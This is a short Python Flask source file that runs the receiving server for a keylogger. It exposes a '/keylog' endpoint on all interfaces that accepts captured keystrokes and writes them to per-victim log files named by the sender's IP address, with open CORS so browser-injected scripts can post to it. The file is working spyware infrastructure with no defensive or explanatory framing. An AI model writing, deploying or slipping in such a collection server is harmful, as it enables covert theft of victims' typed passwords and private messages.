from flask import Flask, request
from flask_restful import Api, Resource, reqparse
from flask_cors import CORS
from datetime import datetime

app = Flask(__name__)
CORS(app)

@app.route('/keylog', methods=['POST'])
def post():
    parser = reqparse.RequestParser()
    parser.add_argument('logged', required=True)
    args = parser.parse_args()
    logged = args['logged']
    source = request.remote_addr
    savelogs(logged, source)
    return {'message' : source + ": " + logged }, 200

@app.route('/home', methods=['GET'])
def home():
    return {'message' : "Welcome"}, 200

def savelogs(log, source):
    now = datetime.now()
    nowtime = now.strftime("%d-%m-%Y_%H:%M:%S")
    f = open(source+".log", "a")
    f.write(nowtime + ": " + log + "\n")
    f.close()

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=8080)
